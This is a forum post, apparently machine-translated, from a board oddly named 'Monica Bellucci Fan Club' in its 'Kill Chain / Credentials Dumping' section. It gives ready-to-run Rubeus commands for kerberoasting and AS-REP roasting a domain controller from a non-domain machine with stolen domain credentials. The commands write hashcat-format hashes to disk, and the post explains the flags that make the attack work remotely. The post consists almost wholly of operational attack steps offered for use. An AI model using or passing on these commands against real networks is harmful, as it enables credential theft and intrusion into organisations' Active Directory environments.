@@ -1,0 +1,62 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Credentials Dumping "
+    Conducting a kerberoasting attack via VPN from a non-domain car with VPN Credentials
+
+Conducting a kerberoasting attack via VPN from a non-domain car with VPN Credits
+cybercat - 1 - 35
+" previous topic next topic "
+
+Pages: 1
+cybercat
+
+    Users
+    Member
+    *
+        3
+        View Profile E-mail Personal Message (Offline)
+
+: Mar 16, 2021, 07:28:30 pm
+Written by
+
+
+```
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+```
+As you can see we are doing the same as in the usual attack, we just add 3 new attributes:
+/dc: - specify the domain controller
+/creduser: - username of the domain user we are launching from
+/credpassword: - password of the domain user we are launching from
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Credentials Dumping "
+    Conducting a kerberoasting attack via VPN from a non-domain car with VPN Credentials
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
